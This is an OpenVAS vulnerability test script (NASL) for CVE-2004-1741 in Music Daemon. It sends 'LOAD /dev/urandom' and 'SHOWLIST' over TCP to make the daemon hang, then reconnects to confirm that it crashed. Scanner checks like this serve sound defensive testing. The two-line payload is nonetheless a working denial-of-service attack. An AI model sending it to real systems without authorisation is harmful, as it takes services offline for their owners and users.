# OpenVAS Vulnerability Test
# $Id: musicd_dos.nasl 9348 2018-04-06 07:01:19Z cfischer $
# Description: Music Daemon Denial of Service
#
# Authors:
# Noam Rathaus
#
# Copyright:
# Copyright (C) 2004 Noam Rathaus
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.14353");
  script_version("2019-04-11T14:06:24+0000");
  script_tag(name:"last_modification", value:"2019-04-11 14:06:24 +0000 (Thu, 11 Apr 2019)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_cve_id("CVE-2004-1741");
  script_bugtraq_id(11006);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_name("Music Daemon Denial of Service");
  script_category(ACT_KILL_HOST);
  script_copyright("This script is Copyright (C) 2004 Noam Rathaus");
  script_family("Remote file access");
  script_dependencies("find_service2.nasl");
  script_require_ports("Services/musicdaemon", 5555);

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"It is possible to cause the Music Daemon to stop
  responding to requests by causing it to load the /dev/random filename as its track list.");

  script_tag(name:"impact", value:"An attacker can cause the product to no longer respond to requests.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("misc_func.inc");

port = get_port_for_service(default:5555, proto:"musicdaemon");

soc = open_sock_tcp(port);
if(!soc)
  exit(0);

recv = recv_line(socket:soc, length:1024);
if("Hello" >< recv) {

  data = string("LOAD /dev/urandom\r\n");
  send(socket:soc, data:data);

  data = string("SHOWLIST\r\n");
  send(socket:soc, data:data);

  close(soc);
  sleep(5);

  soc = open_sock_tcp(port);
  if(!soc) {
    security_message(port:port);
    exit(0);
  }

  recv = recv_line(socket:soc, length:1024, timeout:1);
  if("Hello" >!< recv) {
    security_message(port:port);
    exit(0);
  }
  exit(99);
}

close(soc);
exit(0);